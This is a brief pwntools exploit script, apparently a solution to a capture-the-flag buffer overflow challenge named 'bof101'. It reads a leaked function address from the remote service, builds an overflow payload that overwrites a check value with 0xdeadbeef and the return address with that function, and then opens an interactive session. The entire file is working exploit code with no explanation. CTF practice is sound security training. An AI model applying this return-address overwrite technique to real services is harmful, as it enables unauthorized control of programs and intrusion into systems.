from pwn import *
r=remote("bof101.sstf.site",1337)
context.log_level='debug'

r.recvuntil(": ")
printflag=int(r.recvline().strip(),16)
log.info(hex(printflag))

pay=b'x'*(0x90-4)
pay+=p32(0xdeadbeef)
pay+=p64(printflag)
r.sendline(pay)
r.interactive()
